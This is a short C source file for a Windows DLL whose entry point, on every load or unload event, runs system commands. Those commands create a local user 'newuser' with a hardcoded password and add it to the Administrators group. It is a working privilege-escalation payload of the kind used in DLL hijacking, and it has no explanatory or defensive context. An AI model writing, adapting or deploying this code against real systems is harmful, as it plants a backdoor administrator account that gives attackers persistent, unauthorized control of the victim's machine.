#include <windows.h>
#include <stdlib.h>

// Function to create a user and add to admin group
void systemo() {
    // Add user: "newuser" with password "P@ssw0rd123"
    system("net user newuser P@ssw0rd123 /add");

    // Add the user to Administrators group
    system("net localgroup Administrators newuser /add");
}

// DLL Entry Point
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
        case DLL_THREAD_ATTACH:
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_DETACH:
            systemo();
            break;
    }
    return TRUE;
}
